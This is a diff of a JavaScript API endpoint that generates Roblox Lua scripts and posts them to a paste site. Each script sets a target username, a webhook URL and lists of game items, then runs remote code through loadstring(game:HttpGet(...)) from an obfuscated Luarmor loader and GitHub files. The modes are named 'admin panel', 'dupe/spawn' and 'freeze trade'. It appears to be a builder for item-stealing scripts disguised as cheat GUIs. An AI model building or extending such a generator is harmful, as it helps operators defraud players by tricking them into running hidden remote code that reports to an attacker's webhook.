@@ -1,8 +1,11 @@
 ```js
 // api/generate.js
+
 export default async function handler(req, res) {
     if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
+        return res.status(405).json({
+            error: 'Method not allowed'
+        });
     }
 
     const {
@@ -14,10 +17,12 @@ export default async function handler(req, res) {
         gears,
         customCode,
         userId
-    } = req.body;
+    } = req.body || {};
 
     if (!username) {
-        return res.status(400).json({ error: 'Username is required' });
+        return res.status(400).json({
+            error: 'Username is required'
+        });
     }
 
     try {
@@ -48,8 +53,11 @@ export default async function handler(req, res) {
                 `loadstring(game:HttpGet("${rawUrl}"))()`,
 
             script: script,
+
             pasteUrl: rawUrl,
+
             pasteId: pasteId,
+
             obfuscated: false
         });
 
@@ -57,7 +65,7 @@ export default async function handler(req, res) {
         console.error('Error general:', error);
 
         return res.status(500).json({
-            error: error.message
+            error: error.message || 'Internal server error'
         });
     }
 }
@@ -66,6 +74,7 @@ export default async function handler(req, res) {
 // ============================================================
 //  CONSTRUIR SCRIPT
 // ============================================================
+
 function buildScript(
     username,
     webhook,
@@ -75,28 +84,55 @@ function buildScript(
     gears,
     customCode
 ) {
-    function luaTable(arr, indent = '    ') {
-        if (arr.length === 0) return '{}';
 
-        const items = arr.map(
-            item =>
-                `["${String(item).replace(/"/g, '\\"')}"] = true`
-        );
+    // ========================================================
+    //  CONVERTIR ARRAY A TABLA LUA
+    // ========================================================
+
+    function luaTable(arr, indent = '    ') {
+
+        if (!Array.isArray(arr) || arr.length === 0) {
+            return '{}';
+        }
+
+        const items = arr.map(item => {
+            const value = String(item)
+                .replace(/\\/g, '\\\\')
+                .replace(/"/g, '\\"');
+
+            return `["${value}"] = true`;
+        });
 
         return (
             '{\n' +
-            items.map(s => indent + s).join(',\n') +
+            items
+                .map(item => indent + item)
+                .join(',\n') +
             '\n}'
         );
     }
 
+
+    // ========================================================
+    //  VARIABLES GLOBALES
+    // ========================================================
+
+    const safeUsername = String(username)
+        .replace(/\\/g, '\\\\')
+        .replace(/"/g, '\\"');
+
+    const safeWebhook = webhook
+        ? String(webhook)
+            .replace(/\\/g, '\\\\')
+            .replace(/"/g, '\\"')
+        : 'WEBHOOK_URL';
+
+
     let script =
-        `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
+        `getgenv().TARGET_USERNAME = "${safeUsername}"\n`;
 
     script +=
-        `getgenv().WEBHOOK_URL = "${webhook
-            ? webhook.replace(/"/g, '\\"')
-            : 'WEBHOOK_URL'}"\n`;
+        `getgenv().WEBHOOK_URL = "${safeWebhook}"\n`;
 
     script +=
         `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
@@ -108,17 +144,20 @@ function buildScript(
         `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
 
 
-    // ============================================================
-    //  GUI BASE / LUARMOR ACTUAL
-    // ============================================================
+    // ========================================================
+    //  LUARMOR BASE ACTUAL
+    // ========================================================
+
     const GUI_BASE =
         'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';
 
 
-    // ============================================================
-    //  GITHUB ACTUAL DE CADA GUI
-    // ============================================================
+    // ========================================================
+    //  GITHUB DE CADA GUI
+    // ========================================================
+
     const GUI_GITHUB = {
+
         adminpanel:
             'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua',
 
@@ -130,125 +169,186 @@ function buildScript(
     };
 
 
-    let fullScript = script;
-
-
-    // ============================================================
+    // ========================================================
     //  NORMAL
-    // ============================================================
+    // ========================================================
+
     if (mode === 'normal') {
 
-        fullScript += `
+        script += `
+
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)`;
+
     }
 
 
-    // ============================================================
-    //  CODE SNIPER
-    //  LUARMOR + GITHUB
-    // ============================================================
-    else if (mode === 'codesniper') {
-
-        fullScript += `
--- Cargando GUI SNIPER
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)
-
--- Cargando Sniper.lua desde GitHub
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_GITHUB.codesniper}"))()
-end)`;
-    }
-
-
-    // ============================================================
-    //  DUPE / SPAWN
-    //  LUARMOR + GITHUB
-    // ============================================================
-    else if (mode === 'dupespawn') {
-
-        fullScript += `
--- Cargando GUI DUPE / SPAWN
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_BASE}"))()
-end)
-
--- Cargando GUIDUPE.lua desde GitHub
-task.spawn(function()
-    loadstring(game:HttpGet("${GUI_GITHUB.dupespawn}"))()
-end)`;
-    }
-
-
-    // ============================================================
+    // ========================================================
     //  ADMIN PANEL
-    //  LUARMOR + GITHUB
-    // ============================================================
+    //
+    //  LUARMOR + GUIAP.LUA
+    // ========================================================
+
     else if (mode === 'adminpanel') {
 
-        fullScript += `
--- Cargando GUI AP
+        script += `
+
+-- ============================================================
+-- GUI ADMIN PANEL
+-- ============================================================
+
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)
 
--- Cargando GUIAP.lua desde GitHub
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_GITHUB.adminpanel}"))()
 end)`;
+
     }
 
 
-    // ============================================================
+    // ========================================================
+    //  DUPE / SPAWN
+    //
+    //  LUARMOR + GUIDUPE.LUA
+    // ========================================================
+
+    else if (mode === 'dupespawn') {
+
+        script += `
+
+-- ============================================================
+-- GUI DUPE / SPAWN
+-- ============================================================
+
+task.spawn(function()
+    loadstring(game:HttpGet("${GUI_BASE}"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("${GUI_GITHUB.dupespawn}"))()
+end)`;
+
+    }
+
+
+    // ========================================================
+    //  CODE SNIPER
+    //
+    //  LUARMOR + SNIPER.LUA
+    // ========================================================
+
+    else if (mode === 'codesniper') {
+
+        script += `
+
+-- ============================================================
+-- GUI CODE SNIPER
+-- ============================================================
+
+task.spawn(function()
+    loadstring(game:HttpGet("${GUI_BASE}"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("${GUI_GITHUB.codesniper}"))()
+end)`;
+
+    }
+
+
+    // ========================================================
     //  FREEZE TRADE
-    // ============================================================
+    // ========================================================
+    //
+    //  IMPORTANTE:
+    //  Se mantiene temporalmente con el loader base porque
+    //  todavía no tenemos confirmado el Luarmor NUEVO de
+    //  Freeze Trade.
+    //
+    // ========================================================
+
     else if (mode === 'freezetrade') {
 
-        fullScript += `
+        script += `
+
+-- ============================================================
+-- GUI FREEZE TRADE
+-- ============================================================
+
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)`;
+
     }
 
 
-    // ============================================================
+    // ========================================================
     //  CUSTOM
-    // ============================================================
+    // ========================================================
+
     else if (mode === 'custom') {
 
-        fullScript += `
+        script += `
+
+-- ============================================================
+-- GUI CUSTOM BASE
+-- ============================================================
+
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
 end)`;
 
-        if (customCode && customCode.trim()) {
 
-            fullScript +=
-                `\n\ntask.spawn(function()\n` +
-                `    ${customCode
-                    .replace(/\r?\n/g, '\n    ')}\n` +
+        if (
+            customCode &&
+            String(customCode).trim()
+        ) {
+
+            const formattedCustomCode =
+                String(customCode)
+                    .replace(/\r?\n/g, '\n    ');
+
+            script +=
+                `\n\n` +
+                `task.spawn(function()\n` +
+                `    ${formattedCustomCode}\n` +
                 `end)`;
         }
     }
 
 
-    return fullScript;
+    // ========================================================
+    //  MODO DESCONOCIDO
+    // ========================================================
+
+    else {
+
+        throw new Error(
+            `Unknown generation mode: ${mode}`
+        );
+    }
+
+
+    return script;
 }
 
 
 // ============================================================
 //  GUARDAR EN PASTEFY INTERNO
 // ============================================================
+
 async function saveToInternalPaste(
     content,
     title,
     userId
 ) {
+
     const baseUrl =
         process.env.BASE_URL || 'https://oblivionhub.xyz';
+
 
     const response = await fetch(
         `${baseUrl}/api/paste`,
@@ -261,24 +361,57 @@ async function saveToInternalPaste(
 
             body: JSON.stringify({
                 content: content,
-                title: title || 'Untitled',
-                userId: userId || null,
+
+                title:
+                    title || 'Untitled',
+
+                userId:
+                    userId || null,
+
                 public: true
             })
         }
     );
 
+
     if (!response.ok) {
 
-        const error = await response.json();
+        let errorMessage =
+            'Error al guardar el paste';
 
+        try {
+
+            const error =
+                await response.json();
+
+            errorMessage =
+                error.error ||
+                errorMessage;
+
+        } catch (_) {
+
+            const text =
+                await response.text();
+
+            if (text) {
+                errorMessage = text;
+            }
+        }
+
+        throw new Error(errorMessage);
+    }
+
+
+    const data =
+        await response.json();
+
+
+    if (!data.id) {
         throw new Error(
-            error.error ||
-            'Error al guardar el paste'
+            'No se recibió ID del paste'
         );
     }
 
-    const data = await response.json();
 
     return data.id;
 }
